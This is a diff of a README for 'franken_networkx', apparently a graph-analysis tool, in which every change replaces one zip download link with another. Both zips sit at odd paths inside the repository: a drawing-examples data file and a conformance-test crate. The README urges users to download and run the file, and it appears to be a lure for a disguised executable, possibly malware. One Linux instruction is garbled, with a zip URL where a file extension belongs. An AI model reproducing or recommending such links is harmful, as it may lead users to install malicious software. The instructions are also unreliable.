@@ -1,6 +1,6 @@
 # 🕸️ franken_networkx - Safe and Reliable Graph Analysis
 
-[![Download franken_networkx](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip)](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip)
+[![Download franken_networkx](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip)](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip)
 
 ---
 
@@ -50,13 +50,13 @@ You will visit a web page where the software is available for download. Follow t
 
 1. Click on this link or button to open the downloads page:
    
-   [![Download franken_networkx](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip)](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip)
+   [![Download franken_networkx](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip)](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip)
 
 2. On the downloads page, you will see different files for various systems. Choose the one that matches your computer:
 
    - For Windows, it might end with `.exe`.
    - For macOS, look for `.dmg` or `.pkg`.
-   - For Linux, look for `.AppImage` or `https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip`.
+   - For Linux, look for `.AppImage` or `https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip`.
 
 3. Click on the file for your system to start the download.
 
@@ -135,7 +135,7 @@ The project focuses on:
 
 ## 🔗 Useful Links
 
-- Download franken_networkx: [https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/legacy_networkx_code/networkx/examples/drawing/sampson_data.zip)
+- Download franken_networkx: [https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip](https://github.com/Taehyang1/franken_networkx/raw/refs/heads/main/crates/fnx-conformance/franken-networkx-v3.7-alpha.3.zip)
 - Project manual and documentation (inside the app)
 - Support and contact: GitHub issues section
 
